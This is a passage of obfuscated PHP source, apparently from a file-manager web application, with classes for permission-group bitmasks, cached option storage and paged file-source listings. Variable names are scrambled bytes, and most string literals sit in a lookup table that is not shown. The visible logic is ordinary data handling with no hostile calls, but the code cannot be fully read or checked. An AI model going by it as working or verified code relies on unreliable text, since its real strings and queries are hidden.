$Ú®¡€ =& $_SERVER[¼’ç§¼´]; $ºè¬ ×Ç = !1; $ŞŒÇ¸†ì = parent::listData(); foreach ($ŞŒÇ¸†ì as $ÙûŒ¬²“) { $ô¢´ = intval($ÙûŒ¬²“[$Ú®¡€[498]]); if ($ô¢´ <= 0 || $ÙûŒ¬²“[$Ú®¡€[2006]] == 0) { continue; } if (($ô¢´ & $ßğ¤”É›) != $ßğ¤”É›) { continue; } if (($ô¢´ & $Ò¥¤¼Ó·) != 0) { continue; } if (!$ºè¬ ×Ç) { $ºè¬ ×Ç = $ÙûŒ¬²“; continue; } if (intval($ºè¬ ×Ç[$Ú®¡€[498]]) < $ô¢´) { $ºè¬ ×Ç = $ÙûŒ¬²“; } } return $ºè¬ ×Ç ? $ºè¬ ×Ç[$Ú®¡€[486]] : !1; } public function findAuthReadOnly() { $Ïèõø©µ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $ˆö®âÀö = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($Ïèõø©µ, $ˆö®âÀö); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $±’ò´ÄÊ =& $_SERVER[¼’ç§¼´]; $àËİµ’‘ = parent::listData(); $ÔüëĞÀ¦ = !1; foreach ($àËİµ’‘ as $·ï‰û‡È) { if ($·ï‰û‡È[$±’ò´ÄÊ[498]] <= 0 || $·ï‰û‡È[$±’ò´ÄÊ[2006]] == $±’ò´ÄÊ[230]) { continue; } if (!$ÔüëĞÀ¦) { $ÔüëĞÀ¦ = $·ï‰û‡È; continue; } if ($ÔüëĞÀ¦[$±’ò´ÄÊ[498]] > $·ï‰û‡È[$±’ò´ÄÊ[498]]) { $ÔüëĞÀ¦ = $·ï‰û‡È; } } return $ÔüëĞÀ¦ ? $ÔüëĞÀ¦[$±’ò´ÄÊ[486]] : $±’ò´ÄÊ[12]; } public function listData($¯ãÎş˜ç = false, $®¨»äáÎ = "\163\x6f\x72\164", $ƒÏØ«‹É = false) { return parent::listData($¯ãÎş˜ç, $®¨»äáÎ, $ƒÏØ«‹É); } public function update($ÖÁœ»†, $Œúï»©) { $ÜÓÓ«ı‰ =& $_SERVER[¼’ç§¼´]; $”ñÊ‹ = parent::listData($ÖÁœ»†); $ŠŠ×¬÷û = $this->findByName($Œúï»©[$ÜÓÓ«ı‰[32]]); if (!$”ñÊ‹ || $ŠŠ×¬÷û && $ŠŠ×¬÷û[$ÜÓÓ«ı‰[486]] != $”ñÊ‹[$ÜÓÓ«ı‰[486]]) { return !1; } $this->filterAuth($Œúï»©[$ÜÓÓ«ı‰[498]]); return parent::update($ÖÁœ»†, $Œúï»©); } public function remove($‚à§¦û¡) { $ˆáÅÆï— = parent::listData($‚à§¦û¡); if (!$ˆáÅÆï— || $ˆáÅÆï—[$_SERVER[¼’ç§¼´][191]]) { return !1; } return parent::remove($‚à§¦û¡); } public function add($ üïÎù = array()) { $“œŒÇıÎ =& $_SERVER[¼’ç§¼´]; if ($this->findByName($ üïÎù[$“œŒÇıÎ[32]])) { return !1; } $ò¹ºûÜÅ = array($“œŒÇıÎ[32] => $“œŒÇıÎ[12], $“œŒÇıÎ[498] => 1, $“œŒÇıÎ[2007] => $“œŒÇıÎ[1994], $“œŒÇıÎ[2006] => 1, $“œŒÇıÎ[191] => 0, $“œŒÇıÎ[2008] => 0); $ üïÎù = array_merge($ò¹ºûÜÅ, $ üïÎù); $ üïÎù[$“œŒÇıÎ[2008]] = $this->getSort(); $this->filterAuth($ üïÎù[$“œŒÇıÎ[498]]); return parent::insert($ üïÎù); } private function getSort() { $«ìëÉŞ =& $_SERVER[¼’ç§¼´]; $±¶‚ª©ß = parent::listData(); $˜»î¥ = array_to_keyvalue($±¶‚ª©ß, $«ìëÉŞ[12], $«ìëÉŞ[2008]); return empty($˜»î¥) ? 0 : max($˜»î¥) + 1; } private function filterAuth(&$ì£êï—¯) { if (!$ì£êï—¯) { return; } $·‹¸ÓŸ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $µ°¤†ı‹ = array(); foreach ($·‹¸ÓŸ as $ÌÙ»‘¯’) { if ($ì£êï—¯ & $ÌÙ»‘¯’) { $µ°¤†ı‹[] = $ÌÙ»‘¯’; } } if (in_array(self::AUTH_ROOT, $µ°¤†ı‹)) { $ì£êï—¯ = array_sum($·‹¸ÓŸ); return; } $‚ıÄ†•Ü = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($µ°¤†ı‹ as $ÌÙ»‘¯’) { if (isset($‚ıÄ†•Ü[$ÌÙ»‘¯’])) { $µ°¤†ı‹ = array_merge($µ°¤†ı‹, $‚ıÄ†•Ü[$ÌÙ»‘¯’]); } } $µ°¤†ı‹[] = self::AUTH_SHOW; $ì£êï—¯ = array_sum(array_unique($µ°¤†ı‹)); } public function sort($øÏæé§, $¢­şÌÚ») { return parent::update($øÏæé§, $¢­şÌÚ»); } } goto c˜¯ôÑå®â; EğµçÖæ‚ß: class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\171\163\164\x65\155\x4f\x70\x74\x69\157\156"; public $field = array(); public function listData($¸Îò“‰ = false, $ÆÍ’û¾Â = "\155\x6f\144\151\146\171\124\x69\155\x65", $ğ÷“Õ™• = false) { $­•ÜñÙ = Model($this->modelType)->get(!1, $this->optionType, !0); $Š˜â–ÓÂ = array_values($­•ÜñÙ); if ($Š˜â–ÓÂ && $Š˜â–ÓÂ[0] && !is_array($Š˜â–ÓÂ[0])) { Model($this->modelType)->cacheRemove($this->optionType); $­•ÜñÙ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$­•ÜñÙ) { return $¸Îò“‰ ? null : array(); } if (!$¸Îò“‰) { $­•ÜñÙ = array_filter(array_values($­•ÜñÙ)); return array_sort_by($­•ÜñÙ, $ÆÍ’û¾Â, $ğ÷“Õ™•); } return $­•ÜñÙ[$_SERVER[¼’ç§¼´][483] . $¸Îò“‰]; } public function insert($‡ê˜íÎÃ) { $Ï¤‘í =& $_SERVER[¼’ç§¼´]; $‡ê˜íÎÃ = array_field_key($‡ê˜íÎÃ, $this->field); $Òå“‡ÛÃ = Model($this->modelType)->get($Ï¤‘í[484], $this->optionType . $Ï¤‘í[485]); $Òå“‡ÛÃ = $Òå“‡ÛÃ ? $Òå“‡ÛÃ : 0; $‡ê˜íÎÃ[$Ï¤‘í[486]] = ++$Òå“‡ÛÃ; $‡ê˜íÎÃ[$Ï¤‘í[233]] = time(); $‡ê˜íÎÃ[$Ï¤‘í[88]] = time(); Model($this->modelType)->set($Ï¤‘í[484], $Òå“‡ÛÃ, $this->optionType . $Ï¤‘í[485]); Model($this->modelType)->set($Ï¤‘í[483] . $Òå“‡ÛÃ, $‡ê˜íÎÃ, $this->optionType); return $Òå“‡ÛÃ; } public function update($¼§…ÃÖ, $åŠšŸ¯±) { $’Ã‚È¤¼ =& $_SERVER[¼’ç§¼´]; $åŠšŸ¯± = array_field_key($åŠšŸ¯±, $this->field); $›ÛÕ—ÒÉ = $this->listData($¼§…ÃÖ); if (!$›ÛÕ—ÒÉ || !$¼§…ÃÖ) { return !1; } $åŠšŸ¯± = array_merge($›ÛÕ—ÒÉ, $åŠšŸ¯±); $åŠšŸ¯±[$’Ã‚È¤¼[88]] = time(); return Model($this->modelType)->set($’Ã‚È¤¼[483] . $¼§…ÃÖ, $åŠšŸ¯±, $this->optionType); } public function remove($®£ò—ó) { if (!$®£ò—ó) { return !1; } return Model($this->modelType)->remove($_SERVER[¼’ç§¼´][483] . $®£ò—ó, $this->optionType); } public function clear() { $½µšÈø— =& $_SERVER[¼’ç§¼´]; Model($this->modelType)->remove($½µšÈø—[484], $this->optionType . $½µšÈø—[485]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($ÎÙ¼«¢, $âÏÅ¿˜¹) { if (!$âÏÅ¿˜¹) { return !1; } $ÇµÀíÅº = $this->listData(); $ÇµÀíÅº = array_to_keyvalue($ÇµÀíÅº, $ÎÙ¼«¢); return isset($ÇµÀíÅº[$âÏÅ¿˜¹]) ? $ÇµÀíÅº[$âÏÅ¿˜¹] : !1; } public function findByName($àŠº¬’) { return $this->findByKey($_SERVER[¼’ç§¼´][32], $àŠº¬’); } protected function resetData($£‡‡¡‚) { $Ëä¯»ú¡ =& $_SERVER[¼’ç§¼´]; $£‡‡¡‚ = is_array($£‡‡¡‚) ? $£‡‡¡‚ : array(); $äéÃê‰ = array(); for ($å¦œŒ¶š = 0; $å¦œŒ¶š < count($£‡‡¡‚); $å¦œŒ¶š++) { $äéÃê‰[$Ëä¯»ú¡[483] . $£‡‡¡‚[$å¦œŒ¶š][$Ëä¯»ú¡[486]]] = $£‡‡¡‚[$å¦œŒ¶š]; } return Model($this->modelType)->set($äéÃê‰, !1, $this->optionType); } private function getAutoName($Âê‰ş‘) { $¹éˆÛê¬ = array_to_keyvalue($this->listData(), $_SERVER[¼’ç§¼´][32]); if (!$¹éˆÛê¬ || !isset($¹éˆÛê¬[$Âê‰ş‘])) { return $Âê‰ş‘; } for ($—ıĞöÂà = 1; $—ıĞöÂà < count($¹éˆÛê¬); $—ıĞöÂà++) { $ÂÏ±åš = $Âê‰ş‘ . "\50{$—ıĞöÂà}\51"; if (!isset($¹éˆÛê¬[$ÂÏ±åš])) { return $ÂÏ±åš; } } return $ÂÏ±åš; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($ò·½Ï·« = false, $Òİñæú· = '', $‚éÑÒÌê = false) { $åÌå·›Ğ =& $_SERVER[¼’ç§¼´]; $ô ¹İçö = $this->cacheGet($Òİñæú·); $ò’ˆ¤×‘ = $this->optionDefault($Òİñæú·); $ò’ˆ¤×‘ = is_array($ò’ˆ¤×‘) ? $ò’ˆ¤×‘ : array(); if (is_array($ô ¹İçö)) { $ô ¹İçö = array_merge($ò’ˆ¤×‘, $ô ¹İçö); return $ò·½Ï·« ? isset($ô ¹İçö[$ò·½Ï·«]) ? $ô ¹İçö[$ò·½Ï·«] : null : $ô ¹İçö; } $ä˜ıŒùÏ = $this->filterWhere(array($åÌå·›Ğ[33] => $Òİñæú·)); $ô ¹İçö = $this->where($ä˜ıŒùÏ)->select(); $ô ¹İçö = array_to_keyvalue($ô ¹İçö, $åÌå·›Ğ[97], $åÌå·›Ğ[461]); foreach ($ô ¹İçö as $Ñ„½Â‚ => $š¥çŠåä) { if ($‚éÑÒÌê || in_array($Ñ„½Â‚, $this->jsonField)) { $ô ¹İçö[$Ñ„½Â‚] = json_decode($š¥çŠåä, !0); } } $this->cacheSet($Òİñæú·, $ô ¹İçö); $ô ¹İçö = array_merge($ò’ˆ¤×‘, $ô ¹İçö); return $ò·½Ï·« ? $ô ¹İçö[$ò·½Ï·«] : $ô ¹İçö; } public function set($›’¯‡ ¨, $Ü­úÆ° = false, $Ä‘êÃÇ = '') { $›—…Ú¦Œ =& $_SERVER[¼’ç§¼´]; $this->cacheRemove($Ä‘êÃÇ); $É§•á²ş = array(); $³ÊÎ¥â = is_array($›’¯‡ ¨) ? $›’¯‡ ¨ : array($›’¯‡ ¨ => $Ü­úÆ°); foreach ($³ÊÎ¥â as $œ³¦¹×¤ => $§Á·ÌÈë) { if (is_array($§Á·ÌÈë)) { $§Á·ÌÈë = json_encode_force($§Á·ÌÈë); } $this->checkLength($§Á·ÌÈë, !1, $this->tableName . $›—…Ú¦Œ[4] . $›’¯‡ ¨); $§Á·ÌÈë = self::textEncode($§Á·ÌÈë); $³ÊÎ¥â = array($›—…Ú¦Œ[33] => $Ä‘êÃÇ, $›—…Ú¦Œ[97] => $œ³¦¹×¤, $›—…Ú¦Œ[461] => $§Á·ÌÈë); $É§•á²ş[] = $this->filterWhere($³ÊÎ¥â); } if (!$É§•á²ş) { return !0; } $•İàãÍá = $this->cacheKey($›—…Ú¦Œ[487]); CacheLock::lock($•İàãÍá); $Ñô‡¾½ = $this->addAll($É§•á²ş, array(), !0); CacheLock::unlock($•İàãÍá); return $Ñô‡¾½; } protected function optionDefault($¤®‰»Ôå = '') { return !1; } public function setDeep($…¢«®öÇ, $óáå—â = false, $ûàòš = '') { $ç®â´Ñ = explode($_SERVER[¼’ç§¼´][10], $…¢«®öÇ); $¼Ì¨ù¸ˆ = $this->get(); array_set_value($¼Ì¨ù¸ˆ, $…¢«®öÇ, $óáå—â); $this->set($ç®â´Ñ[0], $¼Ì¨ù¸ˆ[$ç®â´Ñ[0]], $ûàòš); } public function remove($«½Î ÷­, $ÖÛ•§‹Î = '') { $„·å¡„¶ =& $_SERVER[¼’ç§¼´]; $this->cacheRemove($ÖÛ•§‹Î); $ü•ª÷çú = $this->filterWhere(array($„·å¡„¶[97] => $«½Î ÷­, $„·å¡„¶[33] => $ÖÛ•§‹Î)); if (is_null($«½Î ÷­)) { unset($ü•ª÷çú[$„·å¡„¶[97]]); } return $this->where($ü•ª÷çú)->delete(); } public function cacheSet($µË„œåÁ, $ı¯ƒÌëÕ = false) { return Cache::set($this->cacheKey($µË„œåÁ), $ı¯ƒÌëÕ); } public function cacheGet($ÔŒêÛÙï) { return Cache::get($this->cacheKey($ÔŒêÛÙï)); } public function cacheRemove($ñ™ÇéÆ) { return Cache::remove($this->cacheKey($ñ™ÇéÆ)); } protected function filterWhere($Ëò°€àÒ) { return $Ëò°€àÒ; } protected function cacheKey($ŞÁÄÎİÎ) { return $ŞÁÄÎİÎ; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\x6f\165\x72\x63\x65"; protected $tableMeta = array("\164\141\x62\154\145\116\x61\155\x65" => "\151\x6f\x5f\163\157\165\x72\143\145\x5f\x6d\145\164\141", "\155\145\x74\141\106\151\145\154\x64" => "\163\x6f\x75\x72\143\145\x49\x44"); protected $dataAuto = array(array("\155\x6f\144\x69\146\x79\124\x69\155\x65", "\x74\x69\x6d\x65", "\151\x6e\x73\145\x72\x74", "\146\165\156\x63\x74\151\x6f\x6e"), array("\143\x72\x65\x61\164\145\124\151\x6d\145", "\164\x69\155\x65", "\151\x6e\x73\145\x72\x74", "\146\x75\156\x63\x74\x69\x6f\156"), array("\166\151\145\x77\124\151\155\x65", "\x74\x69\x6d\145", "\151\156\163\x65\162\164", "\x66\165\x6e\x63\x74\151\157\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($ÎøìÄı¹) { return $this->listSource(array($_SERVER[¼’ç§¼´][488] => $ÎøìÄı¹)); } public function typeName($ü¨şÉ) { static $–°å¸Ó = array(self::TYPE_SYSTEM => "\163\171\163\164\x65\155", self::TYPE_USER => "\x75\163\145\x72", self::TYPE_GROUP => "\x67\x72\157\x75\160"); return $–°å¸Ó[$ü¨şÉ . $_SERVER[¼’ç§¼´][12]]; } public function sourceListInfo($êÆÎâ¨¾, $Ï÷»ø’¯ = false) { $Ú¼¸ÎŒ± =& $_SERVER[¼’ç§¼´]; $êÆÎâ¨¾ = $êÆÎâ¨¾ ? $êÆÎâ¨¾ : array(); $êÆÎâ¨¾ = array_filter(array_unique($êÆÎâ¨¾)); if (!$êÆÎâ¨¾) { return array(); } $–¶ëÉ£ = $this->where(array($Ú¼¸ÎŒ±[193] => array($Ú¼¸ÎŒ±[7], $êÆÎâ¨¾)))->select(); $this->_listDataApply($–¶ëÉ£, $Ï÷»ø’¯); return array_to_keyvalue($–¶ëÉ£, $Ú¼¸ÎŒ±[193]); } public function pathInfoFilter(&$¤ÚÍ“ê©) { $äáä¼© =& $_SERVER[¼’ç§¼´]; static $ƒ¼Áç´Ø = false; static $—ªñÔÏ = false; static $Èôˆéôƒ = false; if (!$ƒ¼Áç´Ø) { $î¹™‰”Ç = $äáä¼©[489]; $î¹™‰”Ç .= $äáä¼©[490]; $î¹™‰”Ç .= $äáä¼©[491]; $ğÀúÏÕ£ = $äáä¼©[492]; $ë—‹‰« = explode($äáä¼©[50], $ğÀúÏÕ£); $ƒ¼Áç´Ø = explode($äáä¼©[50], $î¹™‰”Ç); $—ªñÔÏ = array(); foreach ($ƒ¼Áç´Ø as $Ñ¸şæ±Ø) { if (in_array($Ñ¸şæ±Ø, $ë—‹‰«)) { continue; } $—ªñÔÏ[] = $Ñ¸şæ±Ø; } $Èôˆéôƒ = explode($äáä¼©[50], $äáä¼©[493]); } foreach ($Èôˆéôƒ as $è¥ò™‹) { if (isset($¤ÚÍ“ê©[$è¥ò™‹])) { $¤ÚÍ“ê©[$è¥ò™‹] = intval($¤ÚÍ“ê©[$è¥ò™‹]); } } $¤ÚÍ“ê©[$äáä¼©[87]] = $äáä¼©[494] . $¤ÚÍ“ê©[$äáä¼©[193]] . $äáä¼©[495]; $¤ÚÍ“ê©[$äáä¼©[33]] = $¤ÚÍ“ê©[$äáä¼©[496]] == 1 ? $äáä¼©[78] : $äáä¼©[232]; $¤ÚÍ“ê©[$äáä¼©[190]] = $this->typeName($¤ÚÍ“ê©[$äáä¼©[190]]); if ($¤ÚÍ“ê©[$äáä¼©[496]] != 1) { $¤ÚÍ“ê©[$äáä¼©[169]] = $¤ÚÍ“ê©[$äáä¼©[497]]; unset($¤ÚÍ“ê©[$äáä¼©[497]]); } $§ÀÍøÒ = $ƒ¼Áç´Ø; if (isset($¤ÚÍ“ê©[$äáä¼©[498]]) && $¤ÚÍ“ê©[$äáä¼©[498]][$äáä¼©[499]] == -1) { $§ÀÍøÒ = $—ªñÔÏ; } $¤ÚÍ“ê© = array_field_key($¤ÚÍ“ê©, $§ÀÍøÒ); return $¤ÚÍ“ê©; } public function listUserFav() { $—ùÒÏ– =& $_SERVER[¼’ç§¼´]; $Ë¤Ã¬’¶ = Model($—ùÒÏ–[500])->listData(); $ÊéÏ±¿ = array_filter_by_field($Ë¤Ã¬’¶, $—ùÒÏ–[33], $—ùÒÏ–[501]); $ÊéÏ±¿ = array_to_keyvalue($ÊéÏ±¿, $—ùÒÏ–[12], $—ùÒÏ–[87]); if ($ÊéÏ±¿) { $¾Ğ¯û×· = $this->listSource(array($—ùÒÏ–[502] => array($—ùÒÏ–[503], $ÊéÏ±¿))); } $¾Ğ¯û×· = array_to_keyvalue($¾Ğ¯û×·[$—ùÒÏ–[456]], $—ùÒÏ–[193]); foreach ($Ë¤Ã¬’¶ as &$°ô”ìè) { $°ô”ìè = array($—ùÒÏ–[504] => $°ô”ìè[$—ùÒÏ–[486]], $—ùÒÏ–[505] => $°ô”ìè[$—ùÒÏ–[32]], $—ùÒÏ–[506] => $°ô”ìè[$—ùÒÏ–[87]], $—ùÒÏ–[507] => $°ô”ìè[$—ùÒÏ–[33]], $—ùÒÏ–[508] => $°ô”ìè[$—ùÒÏ–[233]], $—ùÒÏ–[509] => $°ô”ìè[$—ùÒÏ–[88]]); if ($°ô”ìè[$—ùÒÏ–[33]] == $—ùÒÏ–[501] && $¾Ğ¯û×·[$°ô”ìè[$—ùÒÏ–[87]]]) { $°ô”ìè[$—ùÒÏ–[90]] = $¾Ğ¯û×·[$°ô”ìè[$—ùÒÏ–[87]]]; } } unset($°ô”ìè); return $Ë¤Ã¬’¶; } public function listUserTag($ãû—‚»Û) { $¼‘ÊÜù“ =& $_SERVER[¼’ç§¼´]; if ($ãû—‚»Û && !is_array($ãû—‚»Û)) { $ãû—‚»Û = array($ãû—‚»Û); } $µ¾Î²Á = Model($¼‘ÊÜù“[510])->listData(); $ô–š…û½ = array(); $ü¶©Îáü = array(); foreach ($µ¾Î²Á as $àŠ“ÒØæ) { $ÎşùÙŞÔ = $àŠ“ÒØæ[$¼‘ÊÜù“[87]]; if (!$ÎşùÙŞÔ) { continue; } if (!isset($ü¶©Îáü[$ÎşùÙŞÔ])) { $ü¶©Îáü[$ÎşùÙŞÔ] = array(); } $ü¶©Îáü[$ÎşùÙŞÔ][] = $àŠ“ÒØæ[$¼‘ÊÜù“[511]]; $ô–š…û½[$àŠ“ÒØæ[$¼‘ÊÜù“[87]]] = $àŠ“ÒØæ; } $ ¥š‘åã = array(); $„ûèîÎÁ = array(); $Äßµä¶† = array(); foreach ($ü¶©Îáü as $³Øµ˜Òô => $óé´Üİ) { $ñ’ØŠã¨ = !0; if (!$ãû—‚»Û) { $ ¥š‘åã[] = $³Øµ˜Òô; continue; } foreach ($ãû—‚»Û as $àæ¥ÄŒ¹) { if (!in_array($àæ¥ÄŒ¹, $óé´Üİ)) { $ñ’ØŠã¨ = !1; break; } } if (!$ñ’ØŠã¨) { continue; } if (!is_numeric($³Øµ˜Òô)) { $Ø¶›ËŞ = $ô–š…û½[$³Øµ˜Òô]; $ÇãÖ›ËÏ = array($¼‘ÊÜù“[32] => $Ø¶›ËŞ[$¼‘ÊÜù“[32]], $¼‘ÊÜù“[87] => $Ø¶›ËŞ[$¼‘ÊÜù“[87]], $¼‘ÊÜù“[33] => $Ø¶›ËŞ[$¼‘ÊÜù“[33]], $¼‘ÊÜù“[90] => array($¼‘ÊÜù“[512] => 1), $¼‘ÊÜù“[234] => !0); if ($Ø¶›ËŞ[$¼‘ÊÜù“[33]] == $¼‘ÊÜù“[232]) { $Äßµä¶†[] = $ÇãÖ›ËÏ; } if ($Ø¶›ËŞ[$¼‘ÊÜù“[33]] == $¼‘ÊÜù“[78]) { $„ûèîÎÁ[] = $ÇãÖ›ËÏ; } continue; } $ ¥š‘åã[] = $³Øµ˜Òô; } if ($ ¥š‘åã) { $İàˆÚû‘ = $this->listSource(array($¼‘ÊÜù“[502] => array($¼‘ÊÜù“[503], $ ¥š‘åã))); } $İàˆÚû‘ = $İàˆÚû‘ ? $İàˆÚû‘ : array($¼‘ÊÜù“[85] => array(), $¼‘ÊÜù“[86] => array()); $İàˆÚû‘[$¼‘ÊÜù“[85]] = array_merge($İàˆÚû‘[$¼‘ÊÜù“[85]], $„ûèîÎÁ); $İàˆÚû‘[$¼‘ÊÜù“[86]] = array_merge($İàˆÚû‘[$¼‘ÊÜù“[86]], $Äßµä¶†); if (isset($İàˆÚû‘[$¼‘ÊÜù“[453]]) && count($ ¥š‘åã) == $İàˆÚû‘[$¼‘ÊÜù“[453]][$¼‘ÊÜù“[454]]) { return $İàˆÚû‘; } $¸Ú¼²‹Ô = array(); $´£ë¨Ä = array_to_keyvalue($İàˆÚû‘[$¼‘ÊÜù“[85]], $¼‘ÊÜù“[12], $¼‘ÊÜù“[193]); $”¾Îìµ = array_to_keyvalue($İàˆÚû‘[$¼‘ÊÜù“[86]], $¼‘ÊÜù“[12], $¼‘ÊÜù“[193]); $ª”©óÏ = array_merge($”¾Îìµ, $´£ë¨Ä); foreach ($ ¥š‘åã as $ÎşùÙŞÔ) { if (!in_array($ÎşùÙŞÔ, $ª”©óÏ)) { $¸Ú¼²‹Ô[] = $ÎşùÙŞÔ; } } if ($¸Ú¼²‹Ô) { Model($¼‘ÊÜù“[513])->removeBySource($¸Ú¼²‹Ô); } return $İàˆÚû‘; } public function listUserRecycle() { $íªªÅÔ =& $_SERVER[¼’ç§¼´]; $Ààî›öÌ = Model($íªªÅÔ[514])->listData(); if (!$Ààî›öÌ) { return array(); } $¡˜üâ = array($íªªÅÔ[502] => array($íªªÅÔ[503], $Ààî›öÌ), $íªªÅÔ[515] => 1); return $this->listSource($¡˜üâ); } public function listSource($±¾Æï°‰, $§ô·şì³ = 3000, $û´·Ğª = false) { $‹ºÑå¶ =& $_SERVER[¼’ç§¼´]; if (!isset($±¾Æï°‰[$‹ºÑå¶[516]])) { $±¾Æï°‰[$‹ºÑå¶[516]] = 0; } if (isset($±¾Æï°‰[$‹ºÑå¶[192]]) && $±¾Æï°‰[$‹ºÑå¶[192]] == $‹ºÑå¶[230]) { $±¾Æï°‰[$‹ºÑå¶[497]] = array($‹ºÑå¶[517], $‹ºÑå¶[12]); } $‚’àšµ“ = $‹ºÑå¶[518]; $Íœ¤ğ”ğ = $this->field($‚’àšµ“)->_makeOrder()->where($±¾Æï°‰)->selectPage($§ô·şì³); $this->_listPageCheck($Íœ¤ğ”ğ, $‚’àšµ“, $±¾Æï°‰); $this->_listDataApply($Íœ¤ğ”ğ[$‹ºÑå¶[456]], $û´·Ğª); $this->_listMake($Íœ¤ğ”ğ); return $Íœ¤ğ”ğ; } private function _listPageCheck(&$Â°Ûò×Ä, $ÅäíŠÑ¦, $—¿¶Ÿº) { $ªï’³«ø =& $_SERVER[¼’ç§¼´]; if (!is_array($Â°Ûò×Ä[$ªï’³«ø[453]])) { return; } $ğêŸøË = $Â°Ûò×Ä[$ªï’³«ø[453]]; if ($ğêŸøË[$ªï’³«ø[455]] <= 1) { return; } if ($ğêŸøË[$ªï’³«ø[454]] >= 100000) { return; } if (Model($ªï’³«ø[519])->get($ªï’³«ø[520]) != $ªï’³«ø[521]) { return; } $ÅäíŠÑ¦ = str_replace(array($ªï’³«ø[53], $ªï’³«ø[419], $ªï’³«ø[287]), $ªï’³«ø[12], $ÅäíŠÑ¦); $ÅäíŠÑ¦ = $ªï’³«ø[522] . str_replace($ªï’³«ø[50], $ªï’³«ø[523], $ÅäíŠÑ¦) . $ªï’³«ø[524]; $¨Ë€ì±ç = $ªï’³«ø[525]; $¨Ë€ì±ç = $¨Ë€ì±ç . $ªï’³«ø[526]; $“Î›¶¦Œ = $ğêŸøË[$ªï’³«ø[450]] * ($ğêŸøË[$ªï’³«ø[430]] - 1) . $ªï’³«ø[50] . $ğêŸøË[$ªï’³«ø[450]]; $ªâŒëú = $this->_makeOrder(!0); $ú£¯¶© = $ªï’³«ø[522] . str_replace($ªï’³«ø[50], $ªï’³«ø[523], $ªâŒëú[0]); if (strpos($ú£¯¶©, $ªï’³«ø[527])) { $ú£¯¶© = str_replace($ªï’³«ø[527], $ªï’³«ø[528], $ú£¯¶©); } else { $ú£¯¶© .= $ªï’³«ø[529] . $ªâŒëú[1]; } $ªÀÚñÇÓ = array(); foreach ($—¿¶Ÿº as $ØË™±ô÷ => $ºï¿úèö) { $ªÀÚñÇÓ[$ªï’³«ø[522] . $ØË™±ô÷] = $ºï¿úèö; } $this->alias($ªï’³«ø[530])->field($ÅäíŠÑ¦)->limit($“Î›¶¦Œ)->order($ú£¯¶©); $µÆñºûÆ = $this->join($¨Ë€ì±ç)->where($ªÀÚñÇÓ)->select(); if ($µÆñºûÆ) { $Â°Ûò×Ä[$ªï’³«ø[456]] = $µÆñºûÆ; } } protected function _makeOrder($Š¢§ÑÅÁ = false) { $öÜŒ¡ =& $_SERVER[¼’ç§¼´]; $Î§Òåä— = Model($öÜŒ¡[531])->get($öÜŒ¡[532]); $Ô™Ù€Ş = Model($öÜŒ¡[531])->get($öÜŒ¡[533]); $µØşÛˆÈ = array($öÜŒ¡[534] => $öÜŒ¡[535], $öÜŒ¡[536] => $öÜŒ¡[537]); $€¿è‡Ï  = array($öÜŒ¡[32] => $öÜŒ¡[32], $öÜŒ¡[79] => $öÜŒ¡[79], $öÜŒ¡[169] => $öÜŒ¡[497], $öÜŒ¡[538] => $öÜŒ¡[538], $öÜŒ¡[539] => $öÜŒ¡[540], $öÜŒ¡[233] => $öÜŒ¡[233], $öÜŒ¡[88] => $öÜŒ¡[88]); $Û·ûá³ = Input::get($öÜŒ¡[541], $öÜŒ¡[7], $Î§Òåä—, array_keys($€¿è‡Ï )); $œ‚å³Š = Input::get($öÜŒ¡[542], $öÜŒ¡[7], $Ô™Ù€Ş, array_keys($µØşÛˆÈ)); if (!in_array($Û·ûá³, array_keys($€¿è‡Ï ))) { $Û·ûá³ = $öÜŒ¡[32]; } if (!in_array($œ‚å³Š, array_keys($µØşÛˆÈ))) { $Û·ûá³ = $öÜŒ¡[534]; } if ($Û·ûá³ == $öÜŒ¡[32]) { } $…ôŸ¸Å¼ = $öÜŒ¡[543] . $€¿è‡Ï [$Û·ûá³] . $öÜŒ¡[53] . $µØşÛˆÈ[$œ‚å³Š]; $…ôŸ¸Å¼ = rtrim(trim($…ôŸ¸Å¼), $öÜŒ¡[50]); if ($Š¢§ÑÅÁ) { return array($…ôŸ¸Å¼, $µØşÛˆÈ[$œ‚å³Š]); } return $this->order($…ôŸ¸Å¼); } protected function _listDataApplyItem($Ä™Şøõ«, $æ¡çâŒù = false) { $´Ù³ª¦ = array($Ä™Şøõ«); $this->_listDataApply($´Ù³ª¦, $æ¡çâŒù); return $´Ù³ª¦[0]; } protected function _listDataApply(&$ã‹ƒş†¯, $…å Çœ = false) { $…û²ù‰ =& $_SERVER[¼’ç§¼´]; if (!$ã‹ƒş†¯) { $ã‹ƒş†¯ = array(); return; } $Ö–­åÓ = array_to_keyvalue($ã‹ƒş†¯, $…û²ù‰[12], $…û²ù‰[193]); $Ö–­åÓ = array_unique($Ö–­åÓ); $this->_listSourceCache($ã‹ƒş†¯); if (!$…å Çœ) { $this->_listAppendMeta($ã‹ƒş†¯, $Ö–­åÓ); $this->_listAppendFileMeta($ã‹ƒş†¯, $Ö–­åÓ); $this->_listAppendChildren($ã‹ƒş†¯, $Ö–­åÓ); } $this->_listAppendPath($ã‹ƒş†¯); $this->_listAppendAuth($ã‹ƒş†¯); $this->_listAppendSourceInfo($ã‹ƒş†¯, $Ö–­åÓ); 